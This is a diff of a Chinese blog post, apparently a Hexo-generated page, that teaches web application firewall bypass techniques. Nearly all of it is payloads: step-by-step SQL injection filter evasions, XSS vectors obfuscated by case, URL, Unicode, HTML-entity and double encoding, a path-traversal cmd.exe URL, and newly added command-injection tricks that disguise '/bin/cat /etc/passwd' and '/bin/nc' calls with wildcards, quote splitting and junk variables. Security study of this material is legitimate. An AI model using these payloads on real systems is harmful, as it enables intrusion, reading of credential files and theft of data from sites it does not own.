@@ -100,13 +100,13 @@
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    5.4k
+                    9.6k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
-                    5 mins.
+                    9 mins.
                 </span>
                 
                 
@@ -145,27 +145,62 @@
 <p>2.Fuzz-DB/Attack<br><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb/tree/master/attack</a></p>
 <p>3.Other Payloads 可能会被ban ip，小心为妙。<br><a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">https://github.com/foospidy/payloads</a></p>
 <p>#</p>
-<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p><em>多少waf 使用正则匹配。黑名单检测/bypass</em><br>Case: SQL 注入<br>• Step 1:<br>    过滤关键词: <code>and, or, union</code><br>    可能正则: <code>preg_match(&#39;/(and|or|union)/i&#39;, $id)</code><br>    被拦截的语句: <code>union select user, password from users</code><br>    bypass语句: <code>1 || (select user from users where user_id = 1) = &#39;admin&#39;</code><br>• Step 2:<br>    过滤关键词: <code>and, or, union, where</code><br>    被拦截的语句: <code>1 || (select user from users where user_id = 1) = &#39;admin&#39;</code><br>    bypass语句: <code>1 || (select user from users limit 1) = &#39;admin&#39;</code><br>• Step 3:<br>    过滤关键词: <code>and, or, union, where, limit</code><br>    被拦截的语句: <code>1 || (select user from users limit 1) = &#39;admin&#39;</code><br>    bypass语句: <code>1 || (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</code><br>• Step 4:<br>    过滤关键词: <code>and, or, union, where, limit, group by</code><br>    被拦截的语句: <code>1 || (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</code><br>    bypass语句: <code>1 || (select substr(group_concat(user_id),1,1) user from users ) = 1</code><br>• Step 5:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select</code><br>    被拦截的语句: <code>1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</code><br>    bypass语句: <code>1 || 1 = 1 into outfile &#39;result.txt&#39;</code><br>    bypass语句: <code>1 || substr(user,1,1) = &#39;a&#39;</code><br>• Step 6:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;</code><br>    被拦截的语句: <code>1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</code><br>    bypass语句: <code>1 || user_id is not null</code><br>    bypass语句: <code>1 || substr(user,1,1) = 0x61</code><br>    bypass语句: <code>1 || substr(user,1,1) = unhex(61)</code><br>• Step 7:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;, hex</code><br>    被拦截的语句: <code>1 || substr(user,1,1) = unhex(61)</code><br>    bypass语句: <code>1 || substr(user,1,1) = lower(conv(11,10,36))</code></p>
-<p>• Step 8:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;, hex, substr</code><br>    被拦截的语句: <code>1 || substr(user,1,1) = lower(conv(11,10,36))</code><br>    bypass语句: <code>1 || lpad(user,7,1)</code><br>• Step 9:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;, hex, substr, white space</code><br>    被拦截的语句: <code>1 || lpad(user,7,1)</code><br>    bypass语句: <code>1%0b||%0blpad(user,7,1)</code></p>
+<h2 id="正则绕过"><a href="#正则绕过" class="headerlink" title="正则绕过"></a>正则绕过</h2><p><em>多少waf 使用正则匹配。黑名单检测/bypass</em><br>Case: SQL 注入<br>• Step 1:<br>    过滤关键词: <code>and, or, union</code><br>    可能正则: <code>preg_match(&#39;/(and|or|union)/i&#39;, $id)</code><br>    被拦截的语句: <code>union select user, password from users</code><br>    bypass语句: <code>1 || (select user from users where user_id = 1) = &#39;admin&#39;</code>  </p>
+<p>• Step 2:<br>    过滤关键词: <code>and, or, union, where</code><br>    被拦截的语句: <code>1 || (select user from users where user_id = 1) = &#39;admin&#39;</code><br>    bypass语句: <code>1 || (select user from users limit 1) = &#39;admin&#39;</code>  </p>
+<p>• Step 3:<br>    过滤关键词: <code>and, or, union, where, limit</code><br>    被拦截的语句: <code>1 || (select user from users limit 1) = &#39;admin&#39;</code><br>    bypass语句: <code>1 || (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</code>  </p>
+<p>• Step 4:<br>    过滤关键词: <code>and, or, union, where, limit, group by</code><br>    被拦截的语句: <code>1 || (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</code><br>    bypass语句: <code>1 || (select substr(group_concat(user_id),1,1) user from users ) = 1</code> </p>
+<p>• Step 5:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select</code><br>    被拦截的语句: <code>1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</code><br>    bypass语句: <code>1 || 1 = 1 into outfile &#39;result.txt&#39;</code><br>    bypass语句: <code>1 || substr(user,1,1) = &#39;a&#39;</code>  </p>
+<p>• Step 6:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;</code><br>    被拦截的语句: <code>1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</code><br>    bypass语句: <code>1 || user_id is not null</code><br>    bypass语句: <code>1 || substr(user,1,1) = 0x61</code><br>    bypass语句: <code>1 || substr(user,1,1) = unhex(61)</code>  </p>
+<p>• Step 7:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;, hex</code><br>    被拦截的语句: <code>1 || substr(user,1,1) = unhex(61)</code><br>    bypass语句: <code>1 || substr(user,1,1) = lower(conv(11,10,36))</code>  </p>
+<p>• Step 8:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;, hex, substr</code><br>    被拦截的语句: <code>1 || substr(user,1,1) = lower(conv(11,10,36))</code><br>    bypass语句: <code>1 || lpad(user,7,1)</code>  </p>
+<p>• Step 9:<br>    过滤关键词: <code>and, or, union, where, limit, group by, select, &#39;, hex, substr, white space</code><br>    被拦截的语句: <code>1 || lpad(user,7,1)</code><br>    bypass语句: <code>1%0b||%0blpad(user,7,1)</code></p>
 <h2 id="混淆-编码"><a href="#混淆-编码" class="headerlink" title="混淆/编码"></a>混淆/编码</h2><ol>
-<li><p>大小写:<br> 标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br> Bypassed: <code>&lt;ScRipT&gt;alert()&lt;/sCRipT&gt;</code></p>
-<p> 标准: <code>SELECT * FROM all_tables WHERE OWNER = &#39;DATABASE_NAME&#39;</code><br> Bypassed: <code>sELecT * FrOm all_tables whERe OWNER = &#39;DATABASE_NAME&#39;</code>  </p>
+<li><h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写:"></a>大小写:</h3><p>标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br>Bypassed: <code>&lt;ScRipT&gt;alert()&lt;/sCRipT&gt;</code></p>
+<p>标准: <code>SELECT * FROM all_tables WHERE OWNER = &#39;DATABASE_NAME&#39;</code><br>Bypassed: <code>sELecT * FrOm all_tables whERe OWNER = &#39;DATABASE_NAME&#39;</code>  </p>
 </li>
-<li><p>URL 编码:<br> 被阻断语句: <code>&lt;svG/x=&quot;&gt;&quot;/oNloaD=confirm()//</code><br> Bypassed: <code>%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F</code></p>
-<p> 被阻断语句: <code>uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)</code><br> Bypassed: <code>uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29</code>  </p>
+<li><h3 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码:"></a>URL 编码:</h3><p>被阻断语句: <code>&lt;svG/x=&quot;&gt;&quot;/oNloaD=confirm()//</code><br>Bypassed: <code>%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F</code></p>
+<p>被阻断语句: <code>uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)</code><br>Bypassed: <code>uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29</code>  </p>
 </li>
-<li><p>Unicode 编码:<br> 标准: <code>&lt;marquee onstart=prompt()&gt;</code><br> 混淆: <code>&lt;marquee onstart=\u0070r\u06f\u006dpt()&gt;</code></p>
-<p> 被阻断语句: <code>/?redir=http://google.com</code><br> Bypassed: <code>/?redir=http://google。com (Unicode 替代)</code>  </p>
-<p> 被阻断语句: <code>&lt;marquee loop=1 onfinish=alert()&gt;x</code><br> Bypassed: <code>＜marquee loop＝1 onfinish＝alert︵1)&gt;x (Unicode 替代)</code></p>
+<li><h3 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码:"></a>Unicode 编码:</h3><p>标准: <code>&lt;marquee onstart=prompt()&gt;</code><br>混淆: <code>&lt;marquee onstart=\u0070r\u06f\u006dpt()&gt;</code></p>
+<p>被阻断语句: <code>/?redir=http://google.com</code><br>Bypassed: <code>/?redir=http://google。com (Unicode 替代)</code>  </p>
+<p>被阻断语句: <code>&lt;marquee loop=1 onfinish=alert()&gt;x</code><br>Bypassed: <code>＜marquee loop＝1 onfinish＝alert︵1)&gt;x (Unicode 替代)</code></p>
 </li>
-<li><p>HTML 实体编码:<br> 标准: <code>&quot;&gt;&lt;img src=x onerror=confirm()&gt;</code><br> Encoded: <code>&amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt; (General form)</code><br> Encoded: <code>&amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; (Numeric reference)</code></p>
+<li><h3 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码:"></a>HTML 实体编码:</h3><p>标准: <code>&quot;&gt;&lt;img src=x onerror=confirm()&gt;</code><br>Encoded: <code>&amp;quot;&amp;gt;&amp;lt;img src=x onerror=confirm&amp;lpar;&amp;rpar;&amp;gt; (General form)</code><br>Encoded: <code>&amp;#34;&amp;#62;&amp;#60;img src=x onerror=confirm&amp;#40;&amp;#41;&amp;#62; (Numeric reference)</code></p>
 </li>
-<li><p>混合编码:<br> *WAF规则通常倾向于滤除特定类型的编码.混合编码有效载荷可以绕过这种类型的过滤器.制表符和换行符进一步增加了混淆.  *</p>
+<li><h3 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码:"></a>混合编码:</h3><p>*WAF规则通常倾向于滤除特定类型的编码.混合编码有效载荷可以绕过这种类型的过滤器.制表符和换行符进一步增加了混淆.  *</p>
 </li>
-<li><p>混淆:<br> <code>&lt;A HREF=&quot;h</code><br> <code>tt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</code></p>
+<li><h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆:"></a>混淆:</h3><p><code>&lt;A HREF=&quot;h</code><br><code>tt p://6 6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</code></p>
 </li>
-<li><p>双重URL编码:<br> <em>这个需要服务端多次解析了url编码</em><br> 标准: <code>http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\</code><br> 混淆: <code>http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\</code></p>
-<p> 标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br> 混淆: <code>%253Cscript%253Ealert()%253C%252Fscript%253E</code></p>
+<li><h3 id="双重URL编码"><a href="#双重URL编码" class="headerlink" title="双重URL编码:"></a>双重URL编码:</h3><p><em>这个需要服务端多次解析了url编码.</em><br>标准: <code>http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\</code><br>混淆: <code>http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\</code></p>
+<p>标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br>混淆: <code>%253Cscript%253Ealert()%253C%252Fscript%253E</code></p>
+</li>
+<li><h3 id="通配符使用："><a href="#通配符使用：" class="headerlink" title="通配符使用："></a>通配符使用：</h3><p> 用于linux命令语句注入，通过shell通配符绕过</p>
+<p> 标准:<code>/bin/cat /etc/passwd</code><br> 混淆: <code>/???/??t /???/??ss??</code><br> Used chars: <code>/ ? t s</code>  </p>
+<p> 标准: <code>/bin/nc 127.0.0.1 1337</code><br> 混淆: <code>/???/n? 2130706433 1337</code><br> Used chars: <code>/ ? n [0-9]</code></p>
+</li>
+<li><h3 id="动态payload-生成"><a href="#动态payload-生成" class="headerlink" title="动态payload 生成"></a>动态payload 生成</h3><p> 标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br> 混淆: <code>&lt;script&gt;eval(&#39;al&#39;+&#39;er&#39;+&#39;t()&#39;)&lt;/script&gt;</code>  </p>
+<p> 标准: <code>/bin/cat /etc/passwd</code><br> 混淆: <code>/bi&#39;n&#39;&#39;&#39;/c&#39;&#39;at&#39; /e&#39;tc&#39;/pa&#39;&#39;ss&#39;wd</code>   </p>
+<p> <em>Bash允许执行路径串联</em></p>
+<p> 标准: <code>&lt;iframe/onload=&#39;this[&quot;src&quot;]=&quot;javascript:alert()&quot;&#39;;&gt;</code><br> 混淆: <code>&lt;iframe/onload=&#39;this[&quot;src&quot;]=&quot;jav&quot;+&quot;as&amp;Tab;cr&quot;+&quot;ipt:al&quot;+&quot;er&quot;+&quot;t()&quot;&#39;;&gt;</code></p>
+</li>
+<li><h3 id="垃圾字符"><a href="#垃圾字符" class="headerlink" title="垃圾字符"></a>垃圾字符</h3><p> <em>正常的有效载荷很容易被过滤掉。添加一些垃圾字符有助于避免检测（仅限特定情况）。它们通常有助于混淆基于正则表达式的防火墙.</em>  </p>
+<p>标准: <code>&lt;script&gt;alert()&lt;/script&gt;</code><br>混淆: <code>&lt;script&gt;+-+-1-+-+alert(1)&lt;/script&gt;</code>  </p>
+<p>标准: <code>&lt;BODY onload=alert()&gt;</code><br>混淆: <code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^``=alert()&gt;</code>(此处删除一个反引号，因为Markdown语法问题)</p>
+<p>标准: <code>&lt;a href=javascript;alert()&gt;ClickMe</code><br>Bypassed: <code>&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script&amp;#x3A;&amp;#97lert(1)&gt;ClickMe</code>  </p>
+</li>
+<li><h3 id="插入换行符"><a href="#插入换行符" class="headerlink" title="插入换行符"></a>插入换行符</h3><p><em>部分waf可能会对换行符没有匹配</em></p>
+<p>标准: <code>&lt;iframe src=javascript:confirm(0)&quot;&gt;</code><br>混淆: <code>&lt;iframe src=&quot;%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)&quot;&gt;</code></p>
+</li>
+<li><h3 id="未定义变量"><a href="#未定义变量" class="headerlink" title="未定义变量"></a>未定义变量</h3><p><em>bash 和 perl 执行脚本中加入未定义变量，干扰正则。 随便写个不存在的变量就好。<code>$aaaa,$sdayuhjbsad,$dad2ed</code>都可以。</em><br>Level 1 Obfuscation: Normal<br>标准: <code>/bin/cat /etc/passwd</code><br>混淆: <code>/bin/cat$u /etc/passwd$u</code></p>
+<p>Level 2 Obfuscation: Postion Based<br>标准: <code>/bin/cat /etc/passwd</code><br>混淆: <code>$u/bin$u/cat$u $u/etc$u/passwd$u</code>  </p>
+<p>Level 3 Obfuscation: Random characters<br>标准: <code>/bin/cat /etc/passwd</code><br>混淆: <code>$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff</code>  </p>
+<p>一个精心制作的payload</p>
+<p><code>$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf</code></p>
+</li>
+<li><h3 id="Tab-键和换行符"><a href="#Tab-键和换行符" class="headerlink" title="Tab 键和换行符"></a>Tab 键和换行符</h3><p><em>大多数waf匹配的是空格不是Tab</em></p>
+<p>标准: <code>&lt;IMG SRC=&quot;javascript:alert();&quot;&gt;</code><br>Bypassed: <code>&lt;IMG SRC=&quot; javascript:alert();&quot;&gt;</code><br>变形: <code>&lt;IMG SRC=&quot; jav ascri pt:alert ();&quot;&gt;</code>  </p>
+<p>标准: <code>http://test.com/test?id=1 union select 1,2,3</code><br>标准: <code>http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3</code></p>
+<p>标准: <code>&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code><br>混淆:<br><code>&lt;iframe    src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;</code> (中间有Tab换行)  </p>
 </li>
 </ol>
 
@@ -226,7 +261,7 @@
             <div class="box sticky animated fadeInRight faster">
                 <div id="toc" class="subbox">
                     <h4>目录</h4>
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#各种WAF绕过手法学习"><span class="toc-number">1.</span> <span class="toc-text">各种WAF绕过手法学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正则绕过"><span class="toc-number">1.1.</span> <span class="toc-text">正则绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#混淆-编码"><span class="toc-number">1.2.</span> <span class="toc-text">混淆&#x2F;编码</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#各种WAF绕过手法学习"><span class="toc-number">1.</span> <span class="toc-text">各种WAF绕过手法学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正则绕过"><span class="toc-number">1.1.</span> <span class="toc-text">正则绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#混淆-编码"><span class="toc-number">1.2.</span> <span class="toc-text">混淆&#x2F;编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写"><span class="toc-number">1.2.1.</span> <span class="toc-text">大小写:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL-编码"><span class="toc-number">1.2.2.</span> <span class="toc-text">URL 编码:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode-编码"><span class="toc-number">1.2.3.</span> <span class="toc-text">Unicode 编码:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-实体编码"><span class="toc-number">1.2.4.</span> <span class="toc-text">HTML 实体编码:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#混合编码"><span class="toc-number">1.2.5.</span> <span class="toc-text">混合编码:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#混淆"><span class="toc-number">1.2.6.</span> <span class="toc-text">混淆:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#双重URL编码"><span class="toc-number">1.2.7.</span> <span class="toc-text">双重URL编码:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通配符使用："><span class="toc-number">1.2.8.</span> <span class="toc-text">通配符使用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#动态payload-生成"><span class="toc-number">1.2.9.</span> <span class="toc-text">动态payload 生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#垃圾字符"><span class="toc-number">1.2.10.</span> <span class="toc-text">垃圾字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#插入换行符"><span class="toc-number">1.2.11.</span> <span class="toc-text">插入换行符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#未定义变量"><span class="toc-number">1.2.12.</span> <span class="toc-text">未定义变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tab-键和换行符"><span class="toc-number">1.2.13.</span> <span class="toc-text">Tab 键和换行符</span></a></li></ol></li></ol></li></ol>
                 </div>
             </div>
             
@@ -245,7 +280,7 @@
 </body>
 <footer>
     <p class="copyright" id="copyright">
-        &copy; 2019
+        &copy; 2020
         <span class="gradient-text">
             Swyiic
         </span>.
